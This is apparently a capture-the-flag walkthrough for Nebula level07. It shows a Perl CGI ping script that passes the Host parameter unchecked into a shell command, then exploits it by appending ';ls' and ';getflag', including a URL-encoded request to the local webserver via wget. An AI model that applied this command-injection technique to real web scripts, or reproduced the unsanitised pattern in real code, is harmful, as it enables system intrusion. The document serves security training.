Let's take a look at the source code for the perl script...

```
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

So looking at this script, it appears that it takes input from the "Host" parameter, and passes it to the ping function. The issue with this is it doesn't check to see if the parameters are harmful, thus allowing us to execute other system commands.
Let's prove that the exploit exists, and we will need to include a semicolin so we can begin a new system command.

```
$ cd /home/flag07
$ ls
index.cgi thttpd.conf
$ ./index.cgi Host=;ls
```
It should ouptu the results of it's help, but directly following it on the last line we should see the ouput of the ls command.

```
</pre></body></html>index.cgi thttpd.conf
```
And there it is

Now that we have proved that the exploit works, let's try it with getflag

```
$ ./index.cgi Host=;getflag
```
And after the help portion
```
</pre></body></html>getflag is executing on a non-flag account, this doesn't count
```

So this script isn't running with the proper user id in order to solve the challenge. However when we look in the challenge directory, there appears to be a webserver config file. Let's see what user and port the webserver is configured to run on.

```
$ cat thttp.conf | grep user
# Specifies what user to switch to after initialization and when started as root.
user-flag07
$ cat thttp.conf | grep port
# Specifies an alternate port number to listen on.
port=7007
# all hostnames supported on the local machine. See thttpd(8) for details.
```

So we know that the webserver is running on port 7007, and configured as the level07 user which is what we need. We can use the webserver to run the script, and save the results using a tool called "wget" which allows us to pull webpages. Since we will be dealing with urls, we will have to escape the semicolin by converting it into url encoded (%3B for semicolin) in order for it to work. Also this will require you to be in a directory you can write to.

```
$ cd ~
$ wget http://127.0.0.1:7007/index.cgi?Host=%3Bgetflag
```

then we should just be able to cat the file
```
$ ls
index.cgi?Host=;getflag
$ cat index.cgi?Host=;getflag
<html><head><title>Ping results</title></head><body><pre> You have suxxessfully executed getflag on a target account
```

And just like that we pwned the challenge...

Sources: http://cybergibbons.com/security-2/nebula-walkthrough/nebula-exploit-exercises-walkthrough-level07/
